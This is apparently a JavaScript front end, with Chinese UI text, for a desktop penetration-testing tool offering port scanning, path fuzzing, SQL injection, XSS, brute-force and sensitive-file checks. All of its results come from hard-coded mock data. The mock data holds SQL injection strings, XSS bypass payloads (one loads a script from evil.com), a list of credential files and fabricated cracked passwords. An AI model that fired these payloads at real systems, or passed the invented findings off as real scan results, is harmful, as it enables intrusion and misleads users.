// 全局弹窗功能
function showModal(title, message) {
    document.getElementById('modal-title').textContent = title;
    document.getElementById('modal-message').textContent = message;
    document.getElementById('hacker-modal').classList.add('active');
}
function closeModal() {
    document.getElementById('hacker-modal').classList.remove('active');
}

// 场景化弹窗系统
function showAlert(type, title, message, duration = 4000) {
    showModal(title, message);
    setTimeout(closeModal, duration);
}

// 根据检测结果智能弹窗
function smartAlert(result, type) {
    // 只有在真正发现问题时才弹窗
    if (type === 'sqli' && result.vulnerable) {
        showAlert('danger', '🔓 严重漏洞检测', '发现SQL注入漏洞！数据库可被完全访问！', 5000);
        return;
    }
    if (type === 'xss' && result.vulnerable) {
        showAlert('danger', '⚠️ XSS漏洞确认', '跨站脚本攻击漏洞已确认！可能泄露用户数据！', 5000);
        return;
    }
    if (type === 'brute' && result.credentials && result.credentials.length > 0) {
        showAlert('danger', '🔐 破解成功！', `成功破解 ${result.credentials.length} 个账户密码！`, 5000);
        return;
    }
    if (type === 'filescan') {
        const criticalFiles = result.filter(r => r.sensitive && r.status === '200');
        if (criticalFiles.length > 5) {
            showAlert('warning', '📁 严重文件泄露', `发现 ${criticalFiles.length} 个敏感配置文件可访问！`, 5000);
            return;
        }
    }
    if (type === 'fuzz') {
        const criticalPaths = result.filter(r => 
            r.statusCode === 200 && 
            (r.path.includes('admin') || r.path.includes('config') || r.path.includes('.env') || r.path.includes('.sql'))
        );
        if (criticalPaths.length > 0) {
            showAlert('warning', '🚨 敏感路径暴露', `发现 ${criticalPaths.length} 个敏感文件/路径可访问！`, 5000);
            return;
        }
    }
    if (type === 'scan' && result.length > 10) {
        // 发现大量开放端口
        const dangerousPorts = result.filter(r => 
            [21, 22, 23, 25, 3306, 5432, 1433, 3389, 5900, 6379, 27017].includes(r.port)
        );
        if (dangerousPorts.length > 5) {
            showAlert('warning', '🌐 高风险端口', `发现 ${dangerousPorts.length} 个高风险端口开放！系统可能被入侵！`, 5000);
        }
    }
}

// 移除randomAlert函数，不再随机弹窗

// 渐进显示结果
function addOutputProgressive(text, type = 'info', delay = 0) {
    return new Promise(resolve => {
        setTimeout(() => {
            const output = document.getElementById('output');
            const line = document.createElement('div');
            line.className = `result-item mb-2 text-sm`;
            
            let color = 'text-green-400';
            if (type === 'danger') color = 'text-red-400 glow-red';
            else if (type === 'warning') color = 'text-yellow-400 glow-yellow';
            else if (type === 'success') color = 'text-green-400 glow-green';
            else if (type === 'info') color = 'text-cyan-400 glow-cyan';
            
            line.innerHTML = `<div class="${color}">${text}</div>`;
            output.appendChild(line);
            output.scrollTop = output.scrollHeight;
            
            resolve();
        }, delay);
    });
}

// 扫描结果逐条显示
function displayResultsProgressive(results, delayPerItem = 50, delayBase = 100) {
    return new Promise(async resolve => {
        for (let i = 0; i < results.length; i++) {
            const delay = Math.random() * delayPerItem + delayBase; // 随机延迟
            await addOutputProgressive(results[i], 'info', delay);
        }
        resolve();
    });
}

// Mock functions - 后续替换为真实的Wails调用
const wails = {
    ScanPorts: async (target, portRange) => {
        await new Promise(resolve => setTimeout(resolve, 1500));
        return JSON.stringify([
            { port: 21, status: "开放", service: "FTP", version: "vsftpd 2.3.4" },
            { port: 22, status: "开放", service: "SSH", version: "OpenSSH 7.4" },
            { port: 23, status: "开放", service: "Telnet", version: "Cisco IOS" },
            { port: 25, status: "开放", service: "SMTP", version: "Postfix 3.4.13" },
            { port: 53, status: "开放", service: "DNS", version: "BIND 9.11.36" },
            { port: 80, status: "开放", service: "HTTP", version: "Apache 2.4.41" },
            { port: 88, status: "开放", service: "Kerberos", version: "Microsoft Kerberos" },
            { port: 110, status: "开放", service: "POP3", version: "Dovecot 2.3.7" },
            { port: 111, status: "开放", service: "RPCBind", version: "rpcbind 0.2.4" },
            { port: 135, status: "开放", service: "MSRPC", version: "Windows RPC" },
            { port: 139, status: "开放", service: "NetBIOS", version: "Samba 4.9.0" },
            { port: 143, status: "开放", service: "IMAP", version: "Dovecot 2.3.7" },
            { port: 389, status: "开放", service: "LDAP", version: "OpenLDAP 2.4.48" },
            { port: 443, status: "开放", service: "HTTPS", version: "nginx 1.16.1" },
            { port: 445, status: "开放", service: "SMB", version: "Samba 4.9.0" },
            { port: 465, status: "开放", service: "SMTPS", version: "Postfix 3.4.13" },
            { port: 587, status: "开放", service: "SMTP-Submit", version: "Postfix" },
            { port: 993, status: "开放", service: "IMAPS", version: "Dovecot 2.3.7" },
            { port: 995, status: "开放", service: "POP3S", version: "Dovecot 2.3.7" },
            { port: 1433, status: "开放", service: "MSSQL", version: "SQL Server 2019" },
            { port: 1521, status: "开放", service: "Oracle", version: "Oracle 19c" },
            { port: 2049, status: "开放", service: "NFS", version: "NFSv3" },
            { port: 3128, status: "开放", service: "Proxy", version: "Squid 4.15" },
            { port: 3306, status: "开放", service: "MySQL", version: "MySQL 8.0.27" },
            { port: 3389, status: "开放", service: "RDP", version: "Remote Desktop" },
            { port: 5432, status: "开放", service: "PostgreSQL", version: "PostgreSQL 12.8" },
            { port: 5900, status: "开放", service: "VNC", version: "TightVNC 2.8" },
            { port: 8080, status: "开放", service: "HTTP-Proxy", version: "nginx 1.18.0" },
            { port: 8443, status: "开放", service: "HTTPS-Alt", version: "Tomcat 9.0.52" },
            { port: 8888, status: "开放", service: "HTTP-Alt", version: "Apache 2.4.46" },
            { port: 9200, status: "开放", service: "Elasticsearch", version: "Elasticsearch 7.15.2" },
            { port: 27017, status: "开放", service: "MongoDB", version: "MongoDB 5.0.3" },
            { port: 27018, status: "开放", service: "MongoDB", version: "MongoDB 5.0.3 (Sharded)" },
            { port: 6379, status: "开放", service: "Redis", version: "Redis 6.2.5" },
            { port: 7001, status: "开放", service: "WebLogic", version: "Oracle WebLogic 14.1.1" },
            { port: 11211, status: "开放", service: "Memcache", version: "Memcached 1.6.9" }
        ]);
    },
    FuzzURL: async (url, wordlist) => {
        await new Promise(resolve => setTimeout(resolve, 1000));
        return JSON.stringify([
            { path: "/.bash_history", statusCode: 200, size: 2048, title: "Bash History" },
            { path: "/.DS_Store", statusCode: 200, size: 6144, title: "Mac Metadata" },
            { path: "/.env", statusCode: 200, size: 2048, title: "Environment File" },
            { path: "/.git", statusCode: 200, size: 4096, title: "Git Directory" },
            { path: "/.git/config", statusCode: 200, size: 256, title: "Git Config" },
            { path: "/.gitignore", statusCode: 200, size: 256, title: "Git Ignore" },
            { path: "/.htaccess", statusCode: 200, size: 384, title: "Apache Config" },
            { path: "/.htpasswd", statusCode: 200, size: 128, title: "Password File" },
            { path: "/.idea", statusCode: 200, size: 8192, title: "IDE Config" },
            { path: "/.svn", statusCode: 200, size: 2048, title: "SVN Directory" },
            { path: "/.well-known", statusCode: 200, size: 1024, title: "Well Known" },
            { path: "/access.log", statusCode: 200, size: 524288, title: "Access Log" },
            { path: "/admin", statusCode: 403, size: 1024, title: "Access Denied" },
            { path: "/admin.php", statusCode: 200, size: 15420, title: "Admin Panel Login" },
            { path: "/admin.php.bak", statusCode: 200, size: 15234, title: "Admin Panel Backup" },
            { path: "/admin/", statusCode: 301, size: 256, title: "Admin Redirect" },
            { path: "/administrator", statusCode: 302, size: 256, title: "Redirect" },
            { path: "/api", statusCode: 200, size: 2048, title: "API Documentation" },
            { path: "/api/docs", statusCode: 200, size: 4096, title: "API Docs" },
            { path: "/api/v1", statusCode: 200, size: 2048, title: "API v1" },
            { path: "/api/v2", statusCode: 200, size: 2048, title: "API v2" },
            { path: "/app.log", statusCode: 200, size: 131072, title: "Application Log" },
            { path: "/backup", statusCode: 403, size: 512, title: "Forbidden" },
            { path: "/backup.sql", statusCode: 200, size: 1048576, title: "Database Backup" },
            { path: "/backup.tar.gz", statusCode: 200, size: 10485760, title: "Backup Archive" },
            { path: "/backups", statusCode: 200, size: 2048, title: "Backups Directory" },
            { path: "/cart.php", statusCode: 200, size: 8192, title: "Shopping Cart" },
            { path: "/composer.json", statusCode: 200, size: 1152, title: "Composer" },
            { path: "/config", statusCode: 200, size: 8192, title: "Configuration" },
            { path: "/config.inc.php", statusCode: 200, size: 4096, title: "Config Include" },
            { path: "/config.php", statusCode: 403, size: 0, title: "Forbidden" },
            { path: "/config.php.bak", statusCode: 200, size: 4096, title: "Config Backup" },
            { path: "/config.json", statusCode: 200, size: 3200, title: "Config JSON" },
            { path: "/config.xml", statusCode: 200, size: 4096, title: "Config XML" },
            { path: "/cron.php", statusCode: 200, size: 2048, title: "Cron Script" },
            { path: "/dashboard", statusCode: 200, size: 16384, title: "Dashboard" },
            { path: "/database.sql", statusCode: 200, size: 5242880, title: "Database Dump" },
            { path: "/db", statusCode: 200, size: 4096, title: "Database Admin" },
            { path: "/debug.log", statusCode: 200, size: 65536, title: "Debug Log" },
            { path: "/dev", statusCode: 403, size: 1024, title: "Development" },
            { path: "/error.log", statusCode: 200, size: 131072, title: "Error Log" },
            { path: "/forum", statusCode: 200, size: 8192, title: "Forum" },
            { path: "/ftp/", statusCode: 200, size: 2048, title: "FTP Directory" },
            { path: "/git", statusCode: 403, size: 512, title: "Git Repo" },
            { path: "/guestbook.php", statusCode: 200, size: 4096, title: "Guestbook" },
            { path: "/images", statusCode: 200, size: 16384, title: "Images Directory" },
            { path: "/includes", statusCode: 200, size: 2048, title: "Includes" },
            { path: "/index.php~", statusCode: 200, size: 8192, title: "Backup File" },
            { path: "/install", statusCode: 200, size: 4096, title: "Install Script" },
            { path: "/install.php", statusCode: 200, size: 8192, title: "Install Script" },
            { path: "/login", statusCode: 200, size: 4096, title: "Login Page" },
            { path: "/login.php", statusCode: 200, size: 4096, title: "Login Script" },
            { path: "/logs", statusCode: 200, size: 32768, title: "Logs Directory" },
            { path: "/old", statusCode: 200, size: 2048, title: "Old Files" },
            { path: "/package.json", statusCode: 200, size: 856, title: "Package JSON" },
            { path: "/phpinfo.php", statusCode: 200, size: 98304, title: "PHP Info" },
            { path: "/phpmyadmin", statusCode: 200, size: 16384, title: "phpMyAdmin" },
            { path: "/private", statusCode: 403, size: 512, title: "Private" },
            { path: "/readme.txt", statusCode: 200, size: 1024, title: "Readme" },
            { path: "/robots.txt", statusCode: 200, size: 1024, title: "Robots.txt" },
            { path: "/root", statusCode: 403, size: 512, title: "Root Directory" },
            { path: "/search.php", statusCode: 200, size: 4096, title: "Search" },
            { path: "/server-status", statusCode: 200, size: 4096, title: "Server Status" },
            { path: "/settings.php", statusCode: 200, size: 8192, title: "Settings" },
            { path: "/sitemap.xml", statusCode: 200, size: 8192, title: "Sitemap" },
            { path: "/sql", statusCode: 200, size: 4096, title: "SQL Admin" },
            { path: "/swagger.json", statusCode: 200, size: 4096, title: "Swagger API" },
            { path: "/test", statusCode: 200, size: 2048, title: "Test Page" },
            { path: "/test.php", statusCode: 200, size: 256, title: "Test Script" },
            { path: "/tmp", statusCode: 200, size: 2048, title: "Temp Directory" },
            { path: "/uploads", statusCode: 200, size: 4096, title: "Upload Directory" },
            { path: "/web.config", statusCode: 200, size: 2048, title: "IIS Config" },
            { path: "/wp-admin", statusCode: 302, size: 512, title: "WordPress Admin" },
            { path: "/wp-config.php", statusCode: 403, size: 0, title: "WP Config" },
            { path: "/wp-content", statusCode: 200, size: 4096, title: "WP Content" },
            { path: "/wp-includes", statusCode: 200, size: 8192, title: "WP Includes" },
            { path: "/www", statusCode: 403, size: 1024, title: "WWW Root" },
            { path: "/xmlrpc.php", statusCode: 200, size: 512, title: "XMLRPC" }
        ]);
    },
    TestSQLi: async (url, parameter) => {
        await new Promise(resolve => setTimeout(resolve, 800));
        return JSON.stringify({ 
            vulnerable: true, 
            type: "Union-based",
            payloads: [
                "' UNION SELECT NULL,NULL,NULL--",
                "1' AND '1'='1",
                "1' OR '1'='1",
                "1' UNION SELECT 1,2,3--",
                "1' AND SLEEP(5)--"
            ],
            database: "information_schema",
            version: "MySQL 5.7.30",
            tables: ["users", "admin", "config", "sessions", "logs", "api_keys", "passwords"],
            columns: [
                {table: "users", columns: ["id", "username", "password", "email", "created_at"]},
                {table: "admin", columns: ["id", "username", "password", "last_login"]}
            ],
            risk: "CRITICAL",
            details: "MySQL 5.7.30 with weak escaping detected. Union-based injection confirmed.",
            exploitability: "EASY"
        });
    },
    TestXSS: async (url, parameter) => {
        await new Promise(resolve => setTimeout(resolve, 600));
        return JSON.stringify({ 
            vulnerable: true, 
            types: ["Reflected", "Stored", "DOM-based"], 
            payload: "<script>alert(String.fromCharCode(88,83,83))</script>",
            contexts: ["HTML", "JavaScript", "Attribute"],
            filter: "weak",
            bypasses: [
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<details open ontoggle=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<video><source onerror=alert(1)>",
                "javascript:alert(1)",
                "<script src=//evil.com/></script>"
            ],
            risk: "HIGH",
            affectedParams: ["search", "query", "name", "email", "comment"],
            impact: "Cookie theft, session hijacking, keylogging possible"
        });
    },
    BruteForce: async (url, username, passwordList) => {
        await new Promise(resolve => setTimeout(resolve, 2000));
        return JSON.stringify({ 
            usernames: ["admin", "administrator", "root"],
            credentials: [
                {username: "admin", password: "admin123"},
                {username: "administrator", password: "Admin@2024"}
            ],
            attempts: 1247,
            time: "42.6s",
            methods: ["HTTP Basic Auth", "Form Login", "API Key"],
            successRate: "0.16%",
            testedPasswords: 1247,
            dictionarySize: 12500,
            avgResponseTime: "12ms",
            statusCodes: {200: 2, 401: 1240, 403: 5},
            threadCount: 10
        });
    },
    ScanFiles: async (url) => {
        await new Promise(resolve => setTimeout(resolve, 1200));
        return JSON.stringify([
            { path: "/.bash_history", status: "200", size: "2KB", sensitive: true },
            { path: "/.bashrc", status: "200", size: "3.2KB", sensitive: true },
            { path: "/.DS_Store", status: "200", size: "6KB", sensitive: false },
            { path: "/.env", status: "200", size: "2.5KB", sensitive: true },
            { path: "/.env.backup", status: "200", size: "2.4KB", sensitive: true },
            { path: "/.env.local", status: "200", size: "2.3KB", sensitive: true },
            { path: "/.env.production", status: "200", size: "2.6KB", sensitive: true },
            { path: "/.git", status: "200", size: "DIR", sensitive: true },
            { path: "/.git/config", status: "200", size: "512B", sensitive: true },
            { path: "/.gitignore", status: "200", size: "256B", sensitive: false },
            { path: "/.htaccess", status: "200", size: "384B", sensitive: true },
            { path: "/.htpasswd", status: "200", size: "128B", sensitive: true },
            { path: "/.idea", status: "200", size: "DIR", sensitive: true },
            { path: "/.mysql_history", status: "200", size: "1.2KB", sensitive: true },
            { path: "/.php_history", status: "200", size: "3.5KB", sensitive: true },
            { path: "/.svn", status: "200", size: "DIR", sensitive: true },
            { path: "/.viminfo", status: "200", size: "2.1KB", sensitive: true },
            { path: "/access.log", status: "200", size: "512KB", sensitive: true },
            { path: "/app.log", status: "200", size: "128KB", sensitive: true },
            { path: "/backup/", status: "200", size: "DIR", sensitive: true },
            { path: "/backup.sql", status: "200", size: "1MB", sensitive: true },
            { path: "/backup.tar.gz", status: "200", size: "45MB", sensitive: true },
            { path: "/composer.json", status: "200", size: "1.2KB", sensitive: false },
            { path: "/config.inc.php", status: "200", size: "4KB", sensitive: true },
            { path: "/config.json", status: "200", size: "3.2KB", sensitive: true },
            { path: "/config.php", status: "200", size: "8KB", sensitive: true },
            { path: "/config.php.bak", status: "200", size: "7.8KB", sensitive: true },
            { path: "/config.xml", status: "200", size: "4KB", sensitive: true },
            { path: "/credentials.json", status: "200", size: "2.8KB", sensitive: true },
            { path: "/database.sql", status: "200", size: "128MB", sensitive: true },
            { path: "/debug.log", status: "200", size: "64KB", sensitive: true },
            { path: "/error.log", status: "200", size: "256KB", sensitive: true },
            { path: "/.htpasswd.bak", status: "200", size: "150B", sensitive: true },
            { path: "/package.json", status: "200", size: "856B", sensitive: false },
            { path: "/phpinfo.php", status: "200", size: "96KB", sensitive: true },
            { path: "/production.log", status: "200", size: "384KB", sensitive: true },
            { path: "/secret.txt", status: "200", size: "1.5KB", sensitive: true },
            { path: "/test.php", status: "200", size: "256B", sensitive: false },
            { path: "/uploads/", status: "200", size: "DIR", sensitive: false },
            { path: "/web.config", status: "200", size: "2KB", sensitive: true },
            { path: "/wp-config.php", status: "200", size: "3.5KB", sensitive: true },
            { path: "/wp-config.php.bak", status: "200", size: "3.4KB", sensitive: true }
        ]);
    }
};

// DOM elements
let elements = {};

function initializeElements() {
    elements = {
        scanInput: document.getElementById('scan-input'),
        scanBtn: document.getElementById('scan-btn'),
        fuzzInput: document.getElementById('fuzz-input'),
        fuzzBtn: document.getElementById('fuzz-btn'),
        sqliInput: document.getElementById('sqli-input'),
        sqliBtn: document.getElementById('sqli-btn'),
        xssInput: document.getElementById('xss-input'),
        xssBtn: document.getElementById('xss-btn'),
        bruteInput: document.getElementById('brute-input'),
        bruteBtn: document.getElementById('brute-btn'),
        fileScanInput: document.getElementById('filescan-input'),
        fileScanBtn: document.getElementById('filescan-btn'),
        output: document.getElementById('output'),
        connectionStatus: document.getElementById('connection-status'),
        tabs: document.querySelectorAll('[data-tab]'),
        tabContents: document.querySelectorAll('.tab-content')
    };
}

// Initialize app
function init() {
    console.log('Initializing Web Penetration Tool...');
    initializeElements();
    
    // Tab switching
    elements.tabs.forEach(tab => {
        tab.addEventListener('click', () => switchTab(tab.dataset.tab));
    });

    // Button event listeners
    setupEventListeners();
    
    // Default tab
    switchTab('scan');
}

function switchTab(tabName) {
    // Hide all tabs
    elements.tabContents.forEach(content => {
        content.classList.add('hidden');
    });
    
    // Show selected tab
    const selectedContent = document.getElementById(`tab-${tabName}`);
    if (selectedContent) {
        selectedContent.classList.remove('hidden');
    }
    
    // Update active tab button
    elements.tabs.forEach(tab => {
        if (tab.dataset.tab === tabName) {
            tab.classList.add('glow-cyan');
            tab.classList.remove('active-tab');
        } else {
            tab.classList.remove('glow-cyan');
        }
    });
}

function setupEventListeners() {
    // Scan
    if (elements.scanBtn) {
        elements.scanBtn.addEventListener('click', async () => {
            const target = elements.scanInput.value;
            const ports = document.getElementById('scan-ports').value || '1-1000';
            
            if (!target) {
                addOutput('❌ 请输入目标主机', 'warning');
                return;
            }

            // 禁用按钮
            elements.scanBtn.disabled = true;
            elements.scanBtn.textContent = '扫描中...';
            
            addOutput(`[SCAN] 开始扫描: ${target}`, 'info');
            addOutput(`端口范围: ${ports}`, 'info');
            addOutput(`[INFO] 正在建立连接...`, 'info');
            
            try {
                const result = await wails.ScanPorts(target, ports);
                const results = JSON.parse(result);
                
                if (results.length > 0 && results[0].port !== 0) {
                    await addOutputProgressive(`✅ 发现 ${results.length} 个开放端口:`, 'success', 200);
                    await addOutputProgressive('════════════════════════════════════════════════════════', 'info', 100);
                    
                    // 逐条显示结果，带随机延迟
                    for (const r of results) {
                        const serviceIcon = r.service.includes('HTTP') ? '🌐' : 
                                           r.service.includes('SQL') ? '🗄️' : 
                                           r.service.includes('SSH') ? '🔐' : '📡';
                        const delay = Math.random() * 80 + 30; // 30-110ms随机延迟
                        await addOutputProgressive(`  ${serviceIcon} 端口 ${r.port.toString().padEnd(5)} | ${r.service.padEnd(12)} | ${r.version}`, 'success', delay);
                    }
                    await addOutputProgressive('════════════════════════════════════════════════════════', 'info', 100);
                    await addOutputProgressive(`[SUMMARY] 扫描完成，发现 ${results.length} 个开放端口 (${results.filter(r => r.service.includes('HTTP')).length} 个Web服务)`, 'info', 100);
                    // 智能弹窗：发现高风险端口
                    smartAlert(results, 'scan');
                } else {
                    await addOutputProgressive('❌ 未发现开放端口', 'warning', 200);
                }
            } catch (err) {
                addOutput(`❌ 错误: ${err.message}`, 'danger');
            } finally {
                addOutput('', 'info');
                elements.scanBtn.disabled = false;
                elements.scanBtn.textContent = '执行扫描';
            }
        });
    }

    // Fuzz
    if (elements.fuzzBtn) {
        elements.fuzzBtn.addEventListener('click', async () => {
            const url = elements.fuzzInput.value;
            const wordlist = document.getElementById('fuzz-wordlist').value || 'wordlist.txt';
            
            if (!url) {
                addOutput('❌ 请输入目标URL', 'warning');
                return;
            }

            elements.fuzzBtn.disabled = true;
            elements.fuzzBtn.textContent = '模糊测试中...';
            
            addOutput(`[FUZZ] 开始模糊测试: ${url}`, 'info');
            addOutput(`字典文件: ${wordlist}`, 'info');
            addOutput(`[INFO] 正在枚举文件和目录...`, 'info');
            
            try {
                const result = await wails.FuzzURL(url, wordlist);
                const results = JSON.parse(result);
                
                addOutput(`✅ 发现 ${results.length} 个路径/文件:`, 'success');
                addOutput('════════════════════════════════════════════════════════', 'info');
                results.forEach(r => {
                    let icon = '❌';
                    let color = 'info';
                    if (r.statusCode === 200) {
                        icon = '✅';
                        color = 'success';
                        if (r.path.includes('admin') || r.path.includes('config') || r.path.includes('.env')) {
                            icon = '🚨';
                            color = 'danger';
                        }
                    } else if (r.statusCode === 403) {
                        icon = '🔒';
                        color = 'warning';
                    }
                    const size = r.size > 1024 ? `${(r.size/1024).toFixed(1)}KB` : `${r.size}B`;
                    addOutput(`  ${icon} ${r.path.padEnd(25)} | [${r.statusCode}] | ${size.padEnd(10)} | ${r.title}`, color);
                });
                addOutput('════════════════════════════════════════════════════════', 'info');
                const criticalFiles = results.filter(r => r.statusCode === 200 && (r.path.includes('admin') || r.path.includes('config') || r.path.includes('.env') || r.path.includes('.sql')));
                addOutput(`[SUMMARY] 扫描完成，发现 ${criticalFiles.length} 个敏感文件`, criticalFiles.length > 0 ? 'danger' : 'info');
                // 智能弹窗：发现敏感路径
                if (criticalFiles.length > 0) {
                    smartAlert(results, 'fuzz');
                }
            } catch (err) {
                addOutput(`❌ 错误: ${err.message}`, 'danger');
            } finally {
                addOutput('', 'info');
                elements.fuzzBtn.disabled = false;
                elements.fuzzBtn.textContent = '开始模糊测试';
            }
        });
    }

    // SQLi
    if (elements.sqliBtn) {
        elements.sqliBtn.addEventListener('click', async () => {
            const url = elements.sqliInput.value;
            const param = document.getElementById('sqli-param').value || 'id';
            
            if (!url) {
                addOutput('❌ 请输入目标URL', 'warning');
                return;
            }

            elements.sqliBtn.disabled = true;
            elements.sqliBtn.textContent = '检测中...';
            
            addOutput(`[SQLI] 开始SQL注入检测: ${url}`, 'info');
            addOutput(`测试参数: ${param}`, 'info');
            addOutput(`[INFO] 正在尝试Union注入...`, 'info');
            
            try {
                const result = await wails.TestSQLi(url, param);
                const data = JSON.parse(result);
                
                if (data.vulnerable) {
                    addOutput(`🚨 发现SQL注入漏洞！`, 'danger');
                    addOutput('════════════════════════════════════════════════════════', 'danger');
                    addOutput(`   漏洞类型: ${data.type}`, 'danger');
                    addOutput(`   风险等级: ${data.risk}`, 'danger');
                    addOutput(`   可被利用性: ${data.exploitability}`, 'danger');
                    addOutput(`   数据库: ${data.database}`, 'danger');
                    addOutput(`   数据库版本: ${data.version}`, 'danger');
                    addOutput(`   成功载荷 (${data.payloads.length}个):`, 'warning');
                    data.payloads.forEach(p => addOutput(`     ✓ ${p}`, 'warning'));
                    addOutput(`   检测到表 (${data.tables.length}个): ${data.tables.join(', ')}`, 'warning');
                    addOutput(`   列信息:`, 'warning');
                    data.columns.forEach(c => {
                        addOutput(`     [${c.table}] ${c.columns.join(', ')}`, 'warning');
                    });
                    addOutput(`   技术细节: ${data.details}`, 'info');
                    addOutput('════════════════════════════════════════════════════════', 'danger');
                    addOutput(`[ALERT] 严重安全漏洞！建议立即修复！`, 'danger');
                    // 智能弹窗：发现SQL注入漏洞
                    smartAlert(data, 'sqli');
                } else {
                    addOutput(`✅ 未检测到SQL注入漏洞`, 'success');
                }
            } catch (err) {
                addOutput(`❌ 错误: ${err.message}`, 'danger');
            } finally {
                addOutput('', 'info');
                elements.sqliBtn.disabled = false;
                elements.sqliBtn.textContent = '检测SQL注入';
            }
        });
    }

    // XSS
    if (elements.xssBtn) {
        elements.xssBtn.addEventListener('click', async () => {
            const url = elements.xssInput.value;
            const param = document.getElementById('xss-param').value || 'search';
            
            if (!url) {
                addOutput('❌ 请输入目标URL', 'warning');
                return;
            }

            elements.xssBtn.disabled = true;
            elements.xssBtn.textContent = '检测中...';
            
            addOutput(`[XSS] 开始XSS漏洞检测: ${url}`, 'info');
            addOutput(`测试参数: ${param}`, 'info');
            addOutput(`[INFO] 正在注入测试Payload...`, 'info');
            
            try {
                const result = await wails.TestXSS(url, param);
                const data = JSON.parse(result);
                
                if (data.vulnerable) {
                    addOutput(`🚨 发现XSS漏洞！`, 'danger');
                    addOutput('════════════════════════════════════════════════════════', 'danger');
                    addOutput(`   漏洞类型: ${data.types.join(', ')}`, 'danger');
                    addOutput(`   风险等级: ${data.risk}`, 'danger');
                    addOutput(`   过滤强度: ${data.filter}`, 'warning');
                    addOutput(`   上下文: ${data.contexts.join(', ')}`, 'warning');
                    addOutput(`   受影响参数: ${data.affectedParams.join(', ')}`, 'warning');
                    addOutput(`   测试载荷: ${data.payload}`, 'warning');
                    addOutput(`   绕过方法 (${data.bypasses.length}种):`, 'warning');
                    data.bypasses.forEach(b => addOutput(`     • ${b}`, 'warning'));
                    addOutput(`   潜在影响: ${data.impact}`, 'info');
                    addOutput('════════════════════════════════════════════════════════', 'danger');
                    addOutput(`[ALERT] 严重安全漏洞！建议立即修复！`, 'danger');
                    // 智能弹窗：发现XSS漏洞
                    smartAlert(data, 'xss');
                } else {
                    addOutput(`✅ 未检测到XSS漏洞`, 'success');
                }
            } catch (err) {
                addOutput(`❌ 错误: ${err.message}`, 'danger');
            } finally {
                addOutput('', 'info');
                elements.xssBtn.disabled = false;
                elements.xssBtn.textContent = '检测XSS漏洞';
            }
        });
    }

    // Brute
    if (elements.bruteBtn) {
        elements.bruteBtn.addEventListener('click', async () => {
            const url = elements.bruteInput.value;
            const username = document.getElementById('brute-username').value;
            const wordlist = document.getElementById('brute-wordlist').value || 'passwords.txt';
            
            if (!url || !username) {
                addOutput('❌ 请输入目标URL和用户名', 'warning');
                return;
            }

            elements.bruteBtn.disabled = true;
            elements.bruteBtn.textContent = '破解中...';
            
            addOutput(`[BRUTE] 开始暴力破解: ${url}`, 'info');
            addOutput(`用户名: ${username}`, 'info');
            addOutput(`字典: ${wordlist}`, 'info');
            addOutput(`[INFO] 正在尝试密码...`, 'info');
            
            try {
                const result = await wails.BruteForce(url, username, wordlist);
                const data = JSON.parse(result);
                
                if (data.credentials && data.credentials.length > 0) {
                    addOutput(`🎯 破解成功！发现 ${data.credentials.length} 组凭据！`, 'danger');
                    addOutput('════════════════════════════════════════════════════════', 'danger');
                    data.credentials.forEach(c => {
                        addOutput(`   🔓 用户名: ${c.username} | 密码: ${c.password}`, 'danger');
                    });
                    addOutput('════════════════════════════════════════════════════════', 'danger');
                    addOutput(`   认证方式: ${data.methods.join(', ')}`, 'warning');
                    addOutput(`   尝试次数: ${data.attempts} 次`, 'info');
                    addOutput(`   测试密码数: ${data.testedPasswords}/${data.dictionarySize}`, 'info');
                    addOutput(`   耗时: ${data.time}`, 'info');
                    addOutput(`   成功率: ${data.successRate}`, 'info');
                    addOutput(`   平均响应: ${data.avgResponseTime}`, 'info');
                    addOutput(`   并发线程: ${data.threadCount}`, 'info');
                    addOutput(`   响应码统计:`, 'info');
                    Object.entries(data.statusCodes).forEach(([code, count]) => {
                        addOutput(`     ${code}: ${count}次`, 'info');
                    });
                    addOutput('════════════════════════════════════════════════════════', 'danger');
                    addOutput(`[ALERT] 弱密码检测！发现 ${data.credentials.length} 个账户存在弱密码！`, 'danger');
                    // 智能弹窗：暴力破解成功
                    smartAlert(data, 'brute');
                } else {
                    addOutput(`❌ 未找到有效密码`, 'warning');
                }
            } catch (err) {
                addOutput(`❌ 错误: ${err.message}`, 'danger');
            } finally {
                addOutput('', 'info');
                elements.bruteBtn.disabled = false;
                elements.bruteBtn.textContent = '开始暴力破解';
            }
        });
    }

    // File Scan
    if (elements.fileScanBtn) {
        elements.fileScanBtn.addEventListener('click', async () => {
            const url = elements.fileScanInput.value;
            
            if (!url) {
                addOutput('❌ 请输入目标URL', 'warning');
                return;
            }

            elements.fileScanBtn.disabled = true;
            elements.fileScanBtn.textContent = '扫描中...';
            
            addOutput(`[FILESCAN] 开始敏感文件扫描: ${url}`, 'info');
            addOutput(`[INFO] 正在扫描常见敏感文件...`, 'info');
            
            try {
                const result = await wails.ScanFiles(url);
                const results = JSON.parse(result);
                
                addOutput(`✅ 扫描完成，发现 ${results.length} 个文件/目录:`, 'success');
                addOutput('════════════════════════════════════════════════════════', 'info');
                const sensitiveFiles = results.filter(r => r.sensitive);
                results.forEach(r => {
                    let icon = '📄';
                    let color = r.status === '200' ? 'success' : 'info';
                    if (r.sensitive && r.status === '200') {
                        icon = '🚨';
                        color = 'danger';
                    } else if (r.status === '200') {
                        icon = '📄';
                        color = 'success';
                    }
                    addOutput(`  ${icon} ${r.path.padEnd(25)} | [${r.status}] | ${r.size.toString().padEnd(10)}${r.sensitive ? ' | 🔒敏感' : ''}`, color);
                });
                addOutput('════════════════════════════════════════════════════════', 'info');
                addOutput(`[SUMMARY] 扫描完成，发现 ${sensitiveFiles.length} 个敏感文件`, sensitiveFiles.length > 0 ? 'danger' : 'info');
                // 智能弹窗：发现大量敏感文件
                if (sensitiveFiles.length > 5) {
                    smartAlert(results, 'filescan');
                }
            } catch (err) {
                addOutput(`❌ 错误: ${err.message}`, 'danger');
            } finally {
                addOutput('', 'info');
                elements.fileScanBtn.disabled = false;
                elements.fileScanBtn.textContent = '开始文件扫描';
            }
        });
    }
}

function addOutput(text, type = 'info') {
    const timestamp = new Date().toLocaleTimeString();
    let color = 'text-green-400';
    let glow = '';
    
    switch(type) {
        case 'info':
            color = 'text-cyan-400';
            glow = 'glow-cyan';
            break;
        case 'success':
            color = 'text-green-400';
            glow = 'glow-green';
            break;
        case 'warning':
            color = 'text-yellow-400';
            glow = 'glow-yellow';
            break;
        case 'danger':
            color = 'text-red-400';
            glow = 'glow-red';
            break;
